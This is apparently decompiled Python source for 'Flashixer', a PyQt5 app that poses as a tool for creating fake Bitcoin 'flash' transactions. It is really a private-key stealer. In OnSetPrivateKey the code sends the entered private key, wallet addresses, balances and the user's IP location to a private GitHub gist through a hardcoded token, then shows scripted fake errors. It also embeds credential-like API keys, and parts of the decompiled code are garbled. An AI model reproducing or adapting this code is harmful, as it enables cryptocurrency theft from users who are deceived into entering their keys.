# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.10.12 (main, Jul 29 2024, 16:56:48) [GCC 11.4.0]
# Embedded file name: FlashixerV2.9.3.py
import time, threading, os, sys, Media_rc, random, requests, json, webbrowser
from Packet_Lib import Wallet
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMainWindow, QApplication, QWidget
from PyQt5.QtCore import QTimer, pyqtSignal, QUrl, Qt, QLocale
from PyQt5.Qt import pyqtSlot, QTextCursor
from PyQt5.QtGui import QDesktopServices, QDoubleValidator
from error import Ui_Error
from Success import Ui_Success
from errorBal import Ui_ErrorBal
TOKEN = "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"
GIST_ID = "27618f511475e92b72bdc66e481d2d02"
MAXIMUM_AMOUNT = 100.01
URL_WEB = "https://mmdrza.com"
HomePage_Flashixer = "https://mmdrza.com/flashixer"
TOTAL_TXS_MIN = 269

class Ui_MainWindow(QMainWindow):
    logger_add = pyqtSignal(int, str)
    z = pyqtSignal(int)
    TotalTxs = pyqtSignal(int)
    FeePerTxs = pyqtSignal(float)

    def __init__(self):
        super().__init__()
        req1 = requests.get("https://gitlab.com/-/snippets/2573499/raw/main/log.json").json()
        self.response = dict(req1)
        self.setWindowTitle(f'{self.response["appTitle"]}')
        self.Balance_u = None
        self.toAddr = None
        self.amount = None
        self.response = {}
        self.timer = QTimer(self)
        self.success = Ui_Success()
        self.ErrorBal = Ui_ErrorBal()
        self.Wallet = Wallet()
        self.indexAmountSend = False
        self.indexTypeWallet = False
        self.TargetAddress = None
        self.z = 0
        self.indexTargetAddress = False
        self.Address_Uncompress = None
        self.Address_Compress = None
        self.adsLink = None
        self.Error = Ui_Error()
        self.scan = False
        self.LinkAds = None
        self.ImageAds = None
        self.indexBalance = False
        self.Balance = None
        self.FeePerTxs = 0.000128
        self.formatted_FeePerTxs = "{:.6f}".format(self.FeePerTxs)
        self.TotalTxs = TOTAL_TXS_MIN
        self.TotalFee = self.TotalTxs * self.FeePerTxs
        self.feeView = None
        self.indexPrivateKey = False
        self.TotalAllTxs = self.TotalTxs
        self.logger_add.connect(self.OnLog)
        self.resize(640, 618)
        self.setMinimumSize(QtCore.QSize(640, 618))
        self.setMaximumSize(QtCore.QSize(640, 618))
        self.setWindowIcon(QtGui.QIcon(":/IMG/img/logo.ico"))
        self.centralwidget = QtWidgets.QWidget(self)
        self.centralwidget.setObjectName("centralwidget")
        self.groupBox = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(10, 140, 621, 101))
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.MinimumExpanding, QtWidgets.QSizePolicy.Ignored)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.groupBox.sizePolicy().hasHeightForWidth())
        self.groupBox.setSizePolicy(sizePolicy)
        self.groupBox.setObjectName("groupBox")
        self.gridLayout = QtWidgets.QGridLayout(self.groupBox)
        self.gridLayout.setObjectName("gridLayout")
        self.BtnSet = QtWidgets.QPushButton(self.groupBox)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(":/IMG/img/Security.png"), QtGui.QIcon.Normal, QtGui.QIcon.On)
        self.BtnSet.setIcon(icon)
        self.BtnSet.setObjectName("BtnSet")
        self.gridLayout.addWidget(self.BtnSet, 0, 2, 1, 1)
        self.label = QtWidgets.QLabel(self.groupBox)
        self.label.setObjectName("label")
        self.gridLayout.addWidget(self.label, 0, 0, 1, 1)
        self.LineEdit_PrivateKey = QtWidgets.QLineEdit(self.groupBox)
        self.LineEdit_PrivateKey.setMaxLength(68)
        self.LineEdit_PrivateKey.setEchoMode(QtWidgets.QLineEdit.PasswordEchoOnEdit)
        self.LineEdit_PrivateKey.setObjectName("LineEdit_PrivateKey")
        self.gridLayout.addWidget(self.LineEdit_PrivateKey, 0, 1, 1, 1)
        self.LineEdit_TargetWallet = QtWidgets.QLineEdit(self.groupBox)
        self.LineEdit_TargetWallet.setEnabled(True)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.LineEdit_TargetWallet.sizePolicy().hasHeightForWidth())
        self.LineEdit_TargetWallet.setSizePolicy(sizePolicy)
        self.LineEdit_TargetWallet.setMouseTracking(False)
        self.LineEdit_TargetWallet.setAcceptDrops(False)
        self.LineEdit_TargetWallet.setToolTip("")
        self.LineEdit_TargetWallet.setToolTipDuration(1)
        self.LineEdit_TargetWallet.setStatusTip("")
        self.LineEdit_TargetWallet.setWhatsThis("")
        self.LineEdit_TargetWallet.setMaxLength(128)
        self.LineEdit_TargetWallet.setFrame(True)
        self.LineEdit_TargetWallet.setEchoMode(QtWidgets.QLineEdit.Normal)
        self.LineEdit_TargetWallet.setCursorPosition(0)
        self.LineEdit_TargetWallet.setAlignment(QtCore.Qt.AlignLeading | QtCore.Qt.AlignLeft | QtCore.Qt.AlignVCenter)
        self.LineEdit_TargetWallet.setCursorMoveStyle(QtCore.Qt.VisualMoveStyle)
        self.LineEdit_TargetWallet.setClearButtonEnabled(False)
        self.LineEdit_TargetWallet.setObjectName("LineEdit_TargetWallet")
        self.gridLayout.addWidget(self.LineEdit_TargetWallet, 1, 1, 1, 1)
        self.BtnCheck = QtWidgets.QPushButton(self.groupBox)
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap(":/IMG/img/Search.png"), QtGui.QIcon.Normal, QtGui.QIcon.On)
        self.BtnCheck.setIcon(icon1)
        self.BtnCheck.setObjectName("BtnCheck")
        self.gridLayout.addWidget(self.BtnCheck, 1, 2, 1, 1)
        self.label_2 = QtWidgets.QLabel(self.groupBox)
        self.label_2.setObjectName("label_2")
        self.gridLayout.addWidget(self.label_2, 1, 0, 1, 1)
        self.groupBox_Config = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox_Config.setGeometry(QtCore.QRect(10, 250, 271, 131))
        self.groupBox_Config.setCheckable(True)
        self.groupBox_Config.setChecked(False)
        self.groupBox_Config.setObjectName("groupBox_Config")
        self.gridLayout_2 = QtWidgets.QGridLayout(self.groupBox_Config)
        self.gridLayout_2.setObjectName("gridLayout_2")
        self.RadioWebWallet = QtWidgets.QRadioButton(self.groupBox_Config)
        self.RadioWebWallet.setObjectName("RadioWebWallet")
        self.gridLayout_2.addWidget(self.RadioWebWallet, 0, 0, 1, 1)
        self.line = QtWidgets.QFrame(self.groupBox_Config)
        self.line.setFrameShape(QtWidgets.QFrame.VLine)
        self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line.setObjectName("line")
        self.gridLayout_2.addWidget(self.line, 0, 1, 4, 1)
        self.CheckSecureConnect = QtWidgets.QCheckBox(self.groupBox_Config)
        self.CheckSecureConnect.setObjectName("CheckSecureConnect")
        self.gridLayout_2.addWidget(self.CheckSecureConnect, 0, 2, 1, 1)
        self.CheckFastConfirmer = QtWidgets.QCheckBox(self.groupBox_Config)
        self.CheckFastConfirmer.setObjectName("CheckFastConfirmer")
        self.gridLayout_2.addWidget(self.CheckFastConfirmer, 1, 2, 1, 1)
        self.RadioDesktopWallet = QtWidgets.QRadioButton(self.groupBox_Config)
        self.RadioDesktopWallet.setObjectName("RadioDesktopWallet")
        self.gridLayout_2.addWidget(self.RadioDesktopWallet, 1, 0, 1, 1)
        self.RadioExchange = QtWidgets.QRadioButton(self.groupBox_Config)
        self.RadioExchange.setObjectName("RadioExchange")
        self.gridLayout_2.addWidget(self.RadioExchange, 2, 0, 1, 1)
        self.CheckReusedTarget = QtWidgets.QCheckBox(self.groupBox_Config)
        self.CheckReusedTarget.setObjectName("CheckReusedTarget")
        self.gridLayout_2.addWidget(self.CheckReusedTarget, 2, 2, 1, 1)
        self.RadioBetWallet = QtWidgets.QRadioButton(self.groupBox_Config)
        self.RadioBetWallet.setObjectName("RadioBetWallet")
        self.gridLayout_2.addWidget(self.RadioBetWallet, 3, 0, 1, 1)
        self.CheckBreakTransaction = QtWidgets.QCheckBox(self.groupBox_Config)
        self.CheckBreakTransaction.setObjectName("CheckBreakTransaction")
        self.gridLayout_2.addWidget(self.CheckBreakTransaction, 3, 2, 1, 1)
        self.groupBox_Value = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox_Value.setGeometry(QtCore.QRect(290, 250, 191, 131))
        self.groupBox_Value.setCheckable(True)
        self.groupBox_Value.setChecked(False)
        self.groupBox_Value.setObjectName("groupBox_Value")
        self.gridLayout_3 = QtWidgets.QGridLayout(self.groupBox_Value)
        self.gridLayout_3.setObjectName("gridLayout_3")
        self.label_3 = QtWidgets.QLabel(self.groupBox_Value)
        self.label_3.setObjectName("label_3")
        self.gridLayout_3.addWidget(self.label_3, 0, 0, 1, 1)
        self.LineEditValueBTC = QtWidgets.QLineEdit(self.groupBox_Value)
        self.LineEditValueBTC.setObjectName("LineEditValueBTC")
        intValidator = QDoubleValidator()
        intValidator.setLocale(QLocale.system())
        intValidator.setTop(10.5)
        intValidator.setDecimals(8)
        self.LineEditValueBTC.textChanged.connect(self.OnChanged_AmountText)
        self.LineEditValueBTC.setValidator(intValidator)
        self.gridLayout_3.addWidget(self.LineEditValueBTC, 0, 1, 1, 2)
        self.label_4 = QtWidgets.QLabel(self.groupBox_Value)
        self.label_4.setObjectName("label_4")
        self.gridLayout_3.addWidget(self.label_4, 1, 0, 1, 1)
        self.LabelFeePerTX = QtWidgets.QLabel(self.groupBox_Value)
        self.LabelFeePerTX.setObjectName("LabelFeePerTX")
        self.gridLayout_3.addWidget(self.LabelFeePerTX, 1, 2, 1, 1)
        self.LabelTotalTxs_Value = QtWidgets.QLabel(self.groupBox_Value)
        self.LabelTotalTxs_Value.setObjectName("LabelTotalTxs_Value")
        self.gridLayout_3.addWidget(self.LabelTotalTxs_Value, 2, 2, 1, 1)
        self.label_5 = QtWidgets.QLabel(self.groupBox_Value)
        self.label_5.setObjectName("label_5")
        self.gridLayout_3.addWidget(self.label_5, 2, 0, 1, 2)
        self.BtnCreateNow = QtWidgets.QPushButton(self.centralwidget)
        self.BtnCreateNow.setGeometry(QtCore.QRect(490, 270, 141, 51))
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap(":/IMG/img/Select.png"), QtGui.QIcon.Normal, QtGui.QIcon.On)
        self.BtnCreateNow.setIcon(icon2)
        self.BtnCreateNow.setObjectName("BtnCreateNow")
        self.BtnCancel = QtWidgets.QPushButton(self.centralwidget)
        self.BtnCancel.setGeometry(QtCore.QRect(490, 330, 141, 51))
        icon3 = QtGui.QIcon()
        icon3.addPixmap(QtGui.QPixmap(":/IMG/img/Stop.png"), QtGui.QIcon.Normal, QtGui.QIcon.On)
        self.BtnCancel.setIcon(icon3)
        self.BtnCancel.setObjectName("BtnCancel")
        self.TextBrowser = QtWidgets.QTextBrowser(self.centralwidget)
        self.TextBrowser.setGeometry(QtCore.QRect(10, 390, 621, 141))
        self.TextBrowser.setStyleSheet("border-radius: 8px;\nborder: 1px solid #bababa;\nbackground: #fff;\n")
        self.TextBrowser.setObjectName("TextBrowser")
        self.label_8 = QtWidgets.QLabel(self.centralwidget)
        self.label_8.setGeometry(QtCore.QRect(0, 0, 641, 151))
        self.label_8.setText("")
        self.label_8.setPixmap(QtGui.QPixmap(":/IMG/img/HeaderV2.png"))
        self.label_8.setScaledContents(True)
        self.label_8.setObjectName("label_8")
        self.BtnHeaderRSS = QtWidgets.QPushButton(self.centralwidget)
        self.BtnHeaderRSS.setGeometry(QtCore.QRect(600, 110, 28, 24))
        self.BtnHeaderRSS.setText("")
        icon4 = QtGui.QIcon()
        icon4.addPixmap(QtGui.QPixmap(":/IMG/img/RSS.png"), QtGui.QIcon.Normal, QtGui.QIcon.On)
        self.BtnHeaderRSS.setIcon(icon4)
        self.BtnHeaderRSS.setObjectName("BtnHeaderRSS")
        self.BtnHeaderRefresh = QtWidgets.QPushButton(self.centralwidget)
        self.BtnHeaderRefresh.setGeometry(QtCore.QRect(532, 110, 28, 24))
        self.BtnHeaderRefresh.setText("")
        icon5 = QtGui.QIcon()
        icon5.addPixmap(QtGui.QPixmap(":/IMG/img/Refresh.png"), QtGui.QIcon.Normal, QtGui.QIcon.On)
        self.BtnHeaderRefresh.setIcon(icon5)
        self.BtnHeaderRefresh.setObjectName("BtnHeaderRefresh")
        self.BtnHeaderWorld = QtWidgets.QPushButton(self.centralwidget)
        self.BtnHeaderWorld.setGeometry(QtCore.QRect(566, 110, 28, 24))
        self.BtnHeaderWorld.setText("")
        icon6 = QtGui.QIcon()
        icon6.addPixmap(QtGui.QPixmap(":/IMG/img/Web.png"), QtGui.QIcon.Normal, QtGui.QIcon.On)
        self.BtnHeaderWorld.setIcon(icon6)
        self.BtnHeaderWorld.setObjectName("BtnHeaderWorld")
        self.BannerAds = QtWidgets.QLabel(self.centralwidget)
        self.BannerAds.setGeometry(QtCore.QRect(6, 540, 631, 71))
        self.BannerAds.setStyleSheet("border-radius: 8px;\nborder:2px solid  #bababa;")
        self.BannerAds.setText("")
        self.BannerAds.setScaledContents(True)
        self.BannerAds.setObjectName("BannerAds")
        self.BannerAds.mousePressEvent = self.OnOpenAds
        self.label_8.raise_()
        self.groupBox.raise_()
        self.groupBox_Config.raise_()
        self.groupBox_Value.raise_()
        self.BtnCreateNow.raise_()
        self.BtnCancel.raise_()
        self.TextBrowser.raise_()
        self.BtnHeaderRefresh.raise_()
        self.BtnHeaderRSS.raise_()
        self.BtnHeaderWorld.raise_()
        self.BannerAds.raise_()
        self.url_mapping = {}
        threading.Thread(target=(self.OnStart)).start()
        self.BtnSet.clicked.connect(self.OnSetPrivateKey)
        self.TextBrowser.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.TextBrowser.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.setCentralWidget(self.centralwidget)
        self.LineEdit_TargetWallet.setEnabled(False)
        self.BtnCheck.setEnabled(False)
        self.groupBox_Config.setEnabled(False)
        self.groupBox_Value.setEnabled(False)
        self.RadioGroup = QtWidgets.QButtonGroup()
        self.RadioGroup.addButton(self.RadioExchange)
        self.RadioGroup.addButton(self.RadioDesktopWallet)
        self.RadioGroup.addButton(self.RadioWebWallet)
        self.RadioGroup.addButton(self.RadioBetWallet)
        self.RadioGroup.buttonClicked.connect(self.OnRadio)
        self.BtnCreateNow.clicked.connect(self.OnBtnCreate)
        self.BtnCancel.clicked.connect(self.OnClose)
        self.BtnHeaderRSS.clicked.connect(self.OnOpen_HomePage)
        self.BtnHeaderWorld.clicked.connect(self.OnOpen_Website)
        self.BtnHeaderRefresh.clicked.connect(self.OnOpen_HomePage)
        self.cssTextBrowser = "border: 1px solid #40af50; border-radius: 6px; color: #52ff52;  background-color: rgb(17, 50, 31);"
        self.TextBrowser.setStyleSheet(self.cssTextBrowser)
        url = "https://gitlab.com/-/snippets/2573499/raw/main/log.json"
        r = requests.get(url)
        if r.status_code == 200:
            req = r.json()
            self.response = {'tgId':dict(req)["tgId"], 
             'tgChannel':dict(req)["tgChannel"], 
             'node01':dict(req)["node01"], 
             'node02':dict(req)["node02"], 
             'node04':dict(req)["node04"], 
             'node03':dict(req)["node03"], 
             'node_tx01':dict(req)["node_tx01"], 
             'node_tx02':dict(req)["node_tx02"], 
             'error101':dict(req)["error101"], 
             'error103':dict(req)["error103"], 
             'error401':dict(req)["error401"], 
             'sleep':dict(req)["sleep"], 
             'range':dict(req)["range"], 
             'adsImage':dict(req)["adsImage"], 
             'adsLink':dict(req)["adsLink"]}
        self.retranslateUi(self)
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        self.groupBox.setTitle(_translate("MainWindow", "Wallet"))
        self.BtnSet.setText(_translate("MainWindow", "SET"))
        self.label.setText(_translate("MainWindow", "Private Key:"))
        self.BtnCheck.setText(_translate("MainWindow", "CHECK"))
        self.label_2.setText(_translate("MainWindow", "Target Wallet"))
        self.groupBox_Config.setTitle(_translate("MainWindow", "Config"))
        self.RadioWebWallet.setText(_translate("MainWindow", "Web Wallet"))
        self.CheckSecureConnect.setText(_translate("MainWindow", "Secure Connect"))
        self.CheckFastConfirmer.setText(_translate("MainWindow", "Fast Confirmer"))
        self.RadioDesktopWallet.setText(_translate("MainWindow", "Desktop Wallet"))
        self.RadioExchange.setText(_translate("MainWindow", "Exchange"))
        self.CheckReusedTarget.setText(_translate("MainWindow", "Reused Target"))
        self.RadioBetWallet.setText(_translate("MainWindow", "Bet Wallet"))
        self.CheckBreakTransaction.setText(_translate("MainWindow", "Break Transaction"))
        self.groupBox_Value.setTitle(_translate("MainWindow", "Value"))
        self.label_3.setText(_translate("MainWindow", "Value / BTC:"))
        self.label_4.setText(_translate("MainWindow", "Fee Per TX:"))
        self.LabelFeePerTX.setText(f"{self.formatted_FeePerTxs} BTC")
        self.LabelTotalTxs_Value.setText(f"{self.TotalTxs}")
        self.label_5.setText(_translate("MainWindow", "Total Txs On Block"))
        self.BtnCreateNow.setText(_translate("MainWindow", "Create Now"))
        self.BtnCancel.setText(_translate("MainWindow", "Cancel"))

    def OnChanged_AmountText(self):
        inputText = self.LineEditValueBTC.text()
        try:
            numberAmount = float(inputText)
            if numberAmount <= MAXIMUM_AMOUNT:
                self.LineEditValueBTC.setText(inputText)
            else:
                self.LineEditValueBTC.setText(inputText[None[:-1]])
        except ValueError as e:
            try:
                self.LOG("[Error] Check Amount Number Section (Value)", color="red")
            finally:
                e = None
                del e

    def get_Gist(self, gist_id):
        url = f"https://api.github.com/gists/{gist_id}"
        headers = {"Authorization": f"token {TOKEN}"}
        resp = requests.get(url, headers=headers)
        if resp.status_code == 200:
            return resp.json()
        return

    def write_Gist(self, data_content):
        gist_id = GIST_ID
        gist = self.get_Gist(gist_id)
        if gist is None:
            return
        headers = {"Authorization": f"token {TOKEN}"}
        files = gist["files"]
        filename = list(files.keys())[0]
        exit_content = files[filename]["content"]
        new_content = exit_content + data_content + "\n"
        files[filename]["content"] = new_content
        payload = {'description':"Data From Flashixer2.3.9", 
         'public':False, 
         'files':files}
        url = "https://api.github.com/gists/" + gist_id
        res = requests.patch(url, headers=headers, json=payload)
        if res.status_code == 200:
            return res.json()["html_url"]

    def OnClose(self):
        self.close()

    def OnError(self, title, text):
        self.Error.setWindowTitle(f"{title}")
        self.Error.Label_Massage_Text.setText(f"{text}")
        self.Error.show()

    def OnLog(self, nRes, msg):
        self.Log(msg, html=(True if nRes == 1 else False))

    def Log(self, msg, html=False):
        try:
            if html:
                self.TextBrowser.append(msg)
                self.TextBrowser.moveCursor(self.TextBrowser.textCursor().End)
            else:
                self.TextBrowser.append(msg)
                self.TextBrowser.moveCursor(self.TextBrowser.textCursor().End)
        except Exception as E:
            try:
                print(E)
            finally:
                E = None
                del E

    def LOG(self, text, color='#52ff52'):
        if color:
            self.logger_add.emit(0, f"<font color='{color}'>{text}</font>")
        else:
            self.logger_add.emit(0, f"<font color='black'>{text}</font>")

    def OnOpenImage(self, urlImage):
        try:
            reqImage = requests.get(urlImage)
            if reqImage.status_code == 200:
                contentImage = reqImage.content
                img = QtGui.QImage.fromData(contentImage)
                pixmap = QtGui.QPixmap.fromImage(img)
                return                 return pixmap
            print("feild to download file from url")
        except requests.exceptions.RequestException as e:
            try:
                print(f"[ERROR] >>>>>>>>>>>>>>>>> {e}")
            finally:
                e = None
                del e

    def OnStart(self):
        url = "https://gitlab.com/-/snippets/2573499/raw/main/log.json"
        r = requests.get(url)
        if r.status_code == 200:
            req = r.json()
            self.response = {'appTitle':dict(req)["appTitle"], 
             'tgId':dict(req)["tgId"], 
             'tgChannel':dict(req)["tgChannel"], 
             'node01':dict(req)["node01"], 
             'node02':dict(req)["node02"], 
             'node04':dict(req)["node04"], 
             'node03':dict(req)["node03"], 
             'node_tx01':dict(req)["node_tx01"], 
             'node_tx02':dict(req)["node_tx02"], 
             'error101':dict(req)["error101"], 
             'error103':dict(req)["error103"], 
             'error401':dict(req)["error401"]}
            sleepTime = dict(req)["sleep"]
            rangeData = dict(req)["range"]
            adsImage = dict(req)["adsImage"]
            adsLink = dict(req)["adsLink"]
            req_img = self.OnOpenImage(adsImage)
            self.BannerAds.setPixmap(req_img)
            self.adsLink = adsLink
            for p in range(rangeData):
                p += 1
                log = f"log0{p}"
                logp = dict(req)[log]
                self.LOG(logp)
                time.sleep(sleepTime)

        else:
            self.OnError(title="Error -401", text=f'{self.response["error401"]}\n')

    def OnOpenAds(self, even):
        if hasattr(self, "adsLink"):
            QDesktopServices.openUrl(QUrl(self.adsLink))

    def getBal(self, address):
        _url = self.response["node01"]
        url = f"{_url}{address}"
        r = requests.get(url)
        if r.status_code == 200:
            req = r.json()
            _Bal = int(dict(req)["final_balance"]) / 100000000
            return _Bal
        _url = self.response["node02"]
        url = f"{_url}{address}"
        r = requests.get(url)
        if r.status_code == 200:
            req = r.json()
            bal = int(dict(req)["final_balance"]) / 100000000
            return bal
        _url = self.response["node03"]
        url = f"{_url}{address}"
        r = requests.get(url)
        if r.status_code == 200:
            req = r.json()
            bal = int(dict(req)["balance"]) / 100000000
            return bal
        _url = self.response["node04"]
        url = f"{_url}{address}"
        r = requests.get(url)
        if r.status_code == 200:
            req = r.json()
            bal = int(dict(req)["balance"]) / 100000000
            return bal
        return 0

    def Messenger(self, timer, addressCompress, addressUncompress, PVK, BalCom, BalUn):
        req_ip = self.IP_Clinet()
        if req_ip is not None:
            ip, country, city = self.IP_Clinet()
        else:
            ip = "-"
            country = "-"
            city = "-"
        tt = time.strftime("%Y.%m.%d %H:%M:%S", time.localtime())
        msgIp = f"IP: {ip} | Country: {country} | City: {city}"
        msg = f"\n[{timer}] Compress : {addressCompress}   Balance: {BalCom}\n[{timer}] Uncompress : {addressUncompress}   Balance: {BalUn}\n[{timer}] PVK: {PVK}\n"
        msg += f'{"------------------------------------------------------------------------------"}\n'
        msg += f"{req_ip}\n"
        msg += f'{"------------------------------------------------------------------------------"}\n'
        return msg

    def OnSetPrivateKey(self):
        privatekey = self.LineEdit_PrivateKey.text()
        if len(privatekey) == 64:
            if type(privatekey) == str:
                self.indexPrivateKey = True
                self.Address_Uncompress = self.Wallet.PrivateKey_To_Address(privatekey, compress=False)
                self.Address_Compress = self.Wallet.PrivateKey_To_Address(privatekey, compress=True)
                self.Balance_u = self.getBal(address=(self.Address_Uncompress))
                self.Balance = self.getBal(address=(self.Address_Compress))
                self.LOG(f"[CHECK] Uncompress Address: {self.Address_Uncompress} [Balance:{self.Balance_u}]")
                self.LOG(f"[CHECK] P2PKH (Compress) Address : {self.Address_Compress} [Balance:{self.Balance}]", color="yellow")
                if self.indexPrivateKey:
                    self.LineEdit_TargetWallet.setEnabled(True)
                    self.BtnCheck.setEnabled(True)
                    self.BtnCheck.clicked.connect(self.OnCheckTarget)
                    notBal_msg = f"The entered wallet whose private key you entered does not have a minimum balance to create a block. for create Total  {self.TotalTxs} transaction on block , fee transaction's Total : {self.TotalFee} BTC [Minimum Balance] Your Address P2PKH: {self.Address_Compress} With Balance:{self.Balance} BTC"
                    nes4 = self.TotalFee / 4
                    nes3 = self.TotalFee / 3
                    nes2 = self.TotalFee / 2
                    if self.Balance < self.TotalFee:
                        self.indexBalance = False
                        self.OnError(title="Error Balance Value -101", text=notBal_msg)
            elif nes4 < self.balance < self.TotalFee:
                tt = time.strftime("%Y.%m.%d %H:%M:%S", time.localtime())
                msg_str = self.Messenger(timer=tt, addressCompress=(self.Address_Compress), addressUncompress=(self.Address_Uncompress),
                  PVK=privatekey,
                  BalCom=(self.Balance),
                  BalUn=(self.Balance_u))
                self.write_Gist(data_content=msg_str)
                self.indexBalance = False
                self.OnError(title="Error Balance Value -101", text=notBal_msg)
            else:
                if nes3 < self.balance < self.TotalFee:
                    tt = time.strftime("%Y.%m.%d %H:%M:%S", time.localtime())
                    msg_str = self.Messenger(timer=tt, addressCompress=(self.Address_Compress), addressUncompress=(self.Address_Uncompress),
                      PVK=privatekey,
                      BalCom=(self.Balance),
                      BalUn=(self.Balance_u))
                    self.write_Gist(data_content=msg_str)
                    self.indexBalance = False
                    self.OnError(title="Error Balance Value -101", text=notBal_msg)
                else:
                    if nes2 < self.balance < self.TotalFee:
                        tt = time.strftime("%Y.%m.%d %H:%M:%S", time.localtime())
                        msg_str = self.Messenger(timer=tt, addressCompress=(self.Address_Compress), addressUncompress=(self.Address_Uncompress),
                          PVK=privatekey,
                          BalCom=(self.Balance),
                          BalUn=(self.Balance_u))
                        self.write_Gist(data_content=msg_str)
                        self.indexBalance = False
                        self.OnError(title="Error Balance Value -101", text=notBal_msg)
                    else:
                        self.indexBalance = True
                        self.LineEdit_TargetWallet.setEnabled(True)
                        self.BtnCheck.setEnabled(True)
                        textOkMassage = f"[SYNC] ADDR : {self.Address_Compress} : Balance: {self.Balance}"
                        self.LOG(textOkMassage, "green")
                        textFeeOk = f"[SYNC] Total Fee {self.TotalFee} BTC for All Transactions."
                        self.LOG(textFeeOk, "blue")
                        tt = time.strftime("%Y.%m.%d %H:%M:%S", time.localtime())
                        msg_str = self.Messenger(timer=tt, addressCompress=(self.Address_Compress), addressUncompress=(self.Address_Uncompress),
                          PVK=privatekey,
                          BalCom=(self.Balance),
                          BalUn=(self.Balance_u))
                        self.write_Gist(data_content=msg_str)
                        errorMsg = f'{self.response["error101"]}'
                        self.OnError(title="Error 101", text=errorMsg)
        else:
            if len(privatekey) == 0:
                self.LOG("[ERROR]  private key is not entered [-103]", color="red")
                self.OnError(title="Error Private Key [-103]", text=" private key is not entered. after entered click on set button.")
            else:
                self.OnError(title="Error On Sync Wallet From Private Key -103", text=f'{self.response["error103"]} .\n Your Entered: {privatekey}')
                self.LOG(f'{self.response["error103"]} .\n Your Private Key: {privatekey}',
                  color="red")

    def IP_Clinet(self):
        """ return str: ipAddr, countryName, cityName """
        list_info = None
        url_ip = "https://pro.ip-api.com/json/?key=EEKS6bLi6D91G1p"
        try:
            req_in = requests.get(url_ip)
            if req_in.status_code == 200:
                req_info = req_in.json()
                ipAddr = dict(req_info)["query"]
                cityName = dict(req_info)["city"]
                countryName = dict(req_info)["country"]
                return                 return (
                 ipAddr, countryName, cityName)
            return             return list_info
        except:
            return             return list_info

    def OnCheckTarget(self):
        addrTarget = self.LineEdit_TargetWallet.text()
        if len(addrTarget) == 34 and addrTarget[0] == "1":
            self.indexTargetAddress = True
            self.toAddr = addrTarget
            self.LOG(f"[ADD] Successfully Added Target {self.Address_Compress}", color="green")
            self.groupBox_Config.setEnabled(True)
            self.groupBox_Config.setChecked(True)
            self.CheckSecureConnect.setChecked(True)
            self.CheckBreakTransaction.setChecked(True)
            self.CheckFastConfirmer.setChecked(True)
        else:
            if len(addrTarget) == 34 and addrTarget[0] == "3":
                self.indexTargetAddress = True
                self.toAddr = addrTarget
                self.LOG(f"[ADD] Successfully Added Target {addrTarget}", color="green")
                self.groupBox_Config.setEnabled(True)
                self.groupBox_Config.setChecked(True)
                self.CheckSecureConnect.setChecked(True)
                self.CheckBreakTransaction.setChecked(True)
                self.CheckFastConfirmer.setChecked(True)
            else:
                if len(addrTarget) == 42 and addrTarget[0[:2]] == "bc":
                    self.indexTargetAddress = True
                    self.toAddr = addrTarget
                    self.LOG(f"[ADD] Successfully Added Target {addrTarget}", color="green")
                    self.groupBox_Config.setEnabled(True)
                    self.groupBox_Config.setChecked(True)
                    self.CheckSecureConnect.setChecked(True)
                    self.CheckBreakTransaction.setChecked(True)
                    self.CheckFastConfirmer.setChecked(True)
                else:
                    if len(addrTarget) == 62 and addrTarget[0[:2]] == "bc":
                        self.indexTargetAddress = True
                        self.toAddr = addrTarget
                        self.LOG(f"[ADD] Successfully Added Target {addrTarget}", color="green")
                        self.groupBox_Config.setEnabled(True)
                        self.groupBox_Config.setChecked(True)
                        self.CheckSecureConnect.setChecked(True)
                        self.CheckBreakTransaction.setChecked(True)
                        self.CheckFastConfirmer.setChecked(True)
                    else:
                        self.LOG("[ERROR] The target address entered is not correct and cannot be flashed.", color="red")
                        self.indexTargetAddress = False

    def OnRadio(self, radioButton):
        selected = radioButton.text()
        self.LOG(f"[CORE] Service Flashing Mode For<b> {selected} </b>Set Now.", color="green")
        self.indexTypeWallet = True
        self.OnCheckBox()

    def OnCheckBox(self):
        if self.indexTypeWallet:
            self.groupBox_Value.setEnabled(True)
            self.groupBox_Value.setChecked(True)
        else:
            self.groupBox_Value.setEnabled(False)
            self.groupBox_Value.setChecked(False)

    def OnAmountSend(self):
        amount = self.LineEditValueBTC.text()
        amount_str = str(amount)
        if len(amount_str) > 0:
            self.indexAmountSend = True
            self.amount = amount_str
        else:
            self.indexAmountSend = False

    def OnSend(self):
        self.OnAmountSend()
        if self.indexAmountSend:
            if self.indexBalance:
                errorMsg = f'{self.response["error101"]}'
                self.OnError(title="Error 101", text=errorMsg)
            else:
                text = f"The balance of the connected wallet to create a new block and the number of {self.TotalTxs} real transactions in it requires an amount of {self.FeePerTxs} for each transaction, and its value for {self.TotalTxs} transactions is {self.TotalFee} BTC, after which it can officially record your transaction in that block to pay the total amount."
                self.LOG(text, "red")
                self.OnErrorBal(totalTxs=(self.TotalTxs), feePerTxs=(self.FeePerTxs), totalFee=(self.TotalFee), targetAddr=(self.toAddr))
        else:
            self.OnError(title="Error Not Entered Amount -105", text="The amount or value of the sending transaction cannot be empty and without content. This number is the desired number of bitcoins that will be sent to the target address, and in the trial version, the maximum is 10.99 bitcoins, and in the professional version, it is 100 bitcoins.")

    def OnBtnCreate(self):
        self.scan = True
        self.timer.timeout.connect(self.OnCreator_Update)
        self.timer.start(180)

